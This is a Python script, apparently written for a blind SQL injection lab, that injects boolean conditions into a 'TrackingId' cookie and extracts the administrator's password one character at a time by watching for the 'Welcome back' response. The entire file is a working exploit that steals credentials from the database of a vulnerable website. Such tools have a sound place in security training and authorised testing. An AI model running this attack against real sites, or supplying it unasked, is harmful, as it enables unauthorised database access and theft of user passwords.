import requests as req
import string
import urllib.parse
import argparse
from urllib.parse import urlparse

def main(TRACKING_ID,URL,KEY_WORD,WORD_LIST):
    # Declaration
    found=False
    index=1
    password=""

    # If user not set trackingId cookie it will try to get it's own
    if not TRACKING_ID:
        r = req.get(URL)
        raw_headers = r.headers.get("Set-Cookie","")
        cookies = [c.strip() for c in raw_headers.split(",")]
        for cookie in cookies:
            if cookie.startswith("TrackingId="):
                TRACKING_ID = cookie.split(";", 1)[0].split("=")[1]

    SQLiTrueTest = req.get(URL, cookies={"TrackingId":urllib.parse.quote(TRACKING_ID+"' AND '1'='1")})
    if not KEY_WORD in SQLiTrueTest.text:
        print("This target is not vulnerable to SQLi")
        return


#    Brute-force password by comaping it with each chars
    while(True):    
        for char in WORD_LIST:
            payload=f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}"
            cookie = {"TrackingId":urllib.parse.quote(payload)} # Change there if the cookie names are different
            r = req.get(URL, cookies=cookie)
            if KEY_WORD in r.text:
                password += char
                print(f"Passowrd => {index} => {password}")
                found = True
                break

            print(f"{index} -> {char}")
        if not found:
            break
        else:
            found = False
        index += 1

def is_url(url):
    try :
        res = urlparse(url)
        return all([res.scheme, res.netloc])
    except:
        return False
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="Blind SQLi password tester")
    parser.add_argument('-u', '--url')
    parser.add_argument('-c', '--cookie')

    # User will fill out
    TRACKING_ID="" # Cookie tracking id where you inject the payload
    URL="" # What url you want to test e.g. google.com
    KEY_WORD="Welcome back" # If the injection is valid, match there the keyword
    WORD_LIST = string.ascii_lowercase + string.digits

    args = parser.parse_args()

    if not URL and is_url(args.url):
        URL = args.url
    else:
        print("Please enter valid URL")
    main(TRACKING_ID,URL,KEY_WORD,WORD_LIST)